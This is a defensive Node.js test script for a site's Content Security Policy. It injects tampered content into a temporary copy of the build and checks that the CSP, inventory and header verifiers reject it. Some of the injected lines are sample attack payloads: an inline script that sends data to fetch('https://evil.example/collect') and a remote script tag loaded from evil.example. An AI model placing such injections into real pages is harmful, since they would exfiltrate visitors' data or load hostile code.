#!/usr/bin/env node
/**
 * Adversarial Slice C gates: mutate a temp dist (or temp copies of headers),
 * assert verifiers FAIL, and assert tracked inventory/contract/_headers are untouched.
 */
import { createHash } from 'node:crypto';
import {
  cpSync,
  existsSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  CONTRACT_REL,
  HEADERS_REL,
  INVENTORY_REL,
  cspCanonicallyEquivalent,
  parseCspFromHeaders,
  verifyContractHeadersInventoryEquivalence,
  verifyDistAgainstInventory,
} from './lib/inline-csp.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const DIST = join(ROOT, 'dist');

const TRACKED = [INVENTORY_REL, CONTRACT_REL, HEADERS_REL].map((r) => join(ROOT, r));

function shaFile(p) {
  return createHash('sha256').update(readFileSync(p)).digest('hex');
}

function snapshotTracked() {
  return Object.fromEntries(TRACKED.map((p) => [p, shaFile(p)]));
}

function assertTrackedUnchanged(before, label) {
  const after = snapshotTracked();
  for (const p of TRACKED) {
    if (before[p] !== after[p]) {
      console.error(`FAIL  tracked file modified during ${label}: ${p}`);
      process.exit(1);
    }
  }
}

function mustFail(label, fn) {
  const result = fn();
  if (result.ok) {
    console.error(`FAIL  expected failure for ${label}, but got ok`);
    process.exit(1);
  }
  console.log(`PASS  adversarial ${label} refused (${result.errors[0]})`);
}

if (!existsSync(join(DIST, 'index.html'))) {
  console.error('assert-adversarial-csp: dist missing — run npm run build first');
  process.exit(1);
}

const before = snapshotTracked();

// Baseline must pass
{
  const equiv = verifyContractHeadersInventoryEquivalence(ROOT);
  const match = verifyDistAgainstInventory(ROOT);
  if (!equiv.ok || !match.ok) {
    console.error('FAIL  baseline inventory/contract/dist must pass before adversarial cases');
    for (const e of [...equiv.errors, ...match.errors]) console.error(`  ${e}`);
    process.exit(1);
  }
  console.log('PASS  baseline inventory/contract/dist');
}

const tmp = mkdtempSync(join(tmpdir(), 'luna-csp-adv-'));
try {
  const tmpDist = join(tmp, 'dist');
  cpSync(DIST, tmpDist, { recursive: true });

  // 1) Arbitrary inline same-origin fetch
  {
    const index = join(tmpDist, 'index.html');
    const html = readFileSync(index, 'utf8');
    writeFileSync(index, html.replace('</body>', '<script>fetch("/evil")</script></body>'));
    mustFail('inline same-origin fetch', () => verifyDistAgainstInventory(ROOT, tmpDist));
    // restore for next cases
    cpSync(DIST, tmpDist, { recursive: true });
  }

  // 2) External fetch / remote script
  {
    const index = join(tmpDist, 'index.html');
    const html = readFileSync(index, 'utf8');
    writeFileSync(
      index,
      html.replace('</head>', '<script src="https://evil.example/x.js"></script></head>'),
    );
    // remote src= is not an inline body — also inject inline that calls external fetch
    const html2 = readFileSync(index, 'utf8');
    writeFileSync(
      index,
      html2.replace('</body>', '<script>fetch("https://evil.example/collect")</script></body>'),
    );
    mustFail('inline external fetch', () => verifyDistAgainstInventory(ROOT, tmpDist));
    cpSync(DIST, tmpDist, { recursive: true });
  }

  // 3) Changed block (mutate an approved body → new hash)
  {
    const index = join(tmpDist, 'index.html');
    let html = readFileSync(index, 'utf8');
    html = html.replace(
      'astro-island,astro-slot,astro-static-slot{display:contents}',
      'astro-island,astro-slot,astro-static-slot{display:block}',
    );
    writeFileSync(index, html);
    mustFail('changed block', () => verifyDistAgainstInventory(ROOT, tmpDist));
    cpSync(DIST, tmpDist, { recursive: true });
  }

  // 4) Moved block (copy index island style onto privacy)
  {
    const privacy = join(tmpDist, 'privacy/index.html');
    let html = readFileSync(privacy, 'utf8');
    html = html.replace(
      '</head>',
      '<style>astro-island,astro-slot,astro-static-slot{display:contents}</style></head>',
    );
    writeFileSync(privacy, html);
    mustFail('moved block', () => verifyDistAgainstInventory(ROOT, tmpDist));
    cpSync(DIST, tmpDist, { recursive: true });
  }

  // 5) Duplicate block
  {
    const index = join(tmpDist, 'index.html');
    let html = readFileSync(index, 'utf8');
    html = html.replace(
      '</head>',
      '<style>astro-island,astro-slot,astro-static-slot{display:contents}</style></head>',
    );
    writeFileSync(index, html);
    mustFail('duplicate block', () => verifyDistAgainstInventory(ROOT, tmpDist));
    cpSync(DIST, tmpDist, { recursive: true });
  }

  // 6) Missing block (strip privacy scoped style)
  {
    const privacy = join(tmpDist, 'privacy/index.html');
    let html = readFileSync(privacy, 'utf8');
    html = html.replace(/<style>[\s\S]*?<\/style>/i, '');
    writeFileSync(privacy, html);
    mustFail('missing block', () => verifyDistAgainstInventory(ROOT, tmpDist));
    cpSync(DIST, tmpDist, { recursive: true });
  }

  // 7) Extra CSP hash in a temp _headers / contract pair (via equivalence helper on temp root)
  {
    const tmpRoot = join(tmp, 'site');
    cpSync(join(ROOT, 'security'), join(tmpRoot, 'security'), { recursive: true });
    cpSync(join(ROOT, 'public'), join(tmpRoot, 'public'), { recursive: true });
    // Need package.json build script checks? equivalence only needs the three files.
    const headersPath = join(tmpRoot, HEADERS_REL);
    let headers = readFileSync(headersPath, 'utf8');
    headers = headers.replace(
      "script-src 'self'",
      "script-src 'self' 'sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='",
    );
    writeFileSync(headersPath, headers);
    mustFail('extra hash', () => verifyContractHeadersInventoryEquivalence(tmpRoot));
  }

  // 8) Extra header
  {
    const tmpRoot = join(tmp, 'site-header');
    cpSync(join(ROOT, 'security'), join(tmpRoot, 'security'), { recursive: true });
    cpSync(join(ROOT, 'public'), join(tmpRoot, 'public'), { recursive: true });
    const headersPath = join(tmpRoot, HEADERS_REL);
    let headers = readFileSync(headersPath, 'utf8');
    headers = headers.replace('X-Frame-Options: DENY', 'X-Frame-Options: DENY\n  X-Evil: 1');
    writeFileSync(headersPath, headers);
    mustFail('extra header', () => verifyContractHeadersInventoryEquivalence(tmpRoot));
  }

  // 9) Extra directive
  {
    const tmpRoot = join(tmp, 'site-dir');
    cpSync(join(ROOT, 'security'), join(tmpRoot, 'security'), { recursive: true });
    cpSync(join(ROOT, 'public'), join(tmpRoot, 'public'), { recursive: true });
    const headersPath = join(tmpRoot, HEADERS_REL);
    let headers = readFileSync(headersPath, 'utf8');
    headers = headers.replace(
      "frame-ancestors 'none'",
      "frame-ancestors 'none'; worker-src 'self'",
    );
    writeFileSync(headersPath, headers);
    // Also need contract mismatch — equivalence compares contract vs headers
    mustFail('extra directive', () => verifyContractHeadersInventoryEquivalence(tmpRoot));

    // Sanity: canonical helper detects directive drift
    const good = parseCspFromHeaders(readFileSync(join(ROOT, HEADERS_REL), 'utf8'));
    const bad = parseCspFromHeaders(readFileSync(headersPath, 'utf8'));
    if (cspCanonicallyEquivalent(good, bad)) {
      console.error('FAIL  canonical helper should reject extra directive');
      process.exit(1);
    }
    console.log('PASS  canonical helper rejects extra directive');
  }
} finally {
  rmSync(tmp, { recursive: true, force: true });
}

assertTrackedUnchanged(before, 'adversarial suite');
console.log('PASS  tracked inventory/contract/_headers unmodified');
console.log('assert-adversarial-csp: PASS');
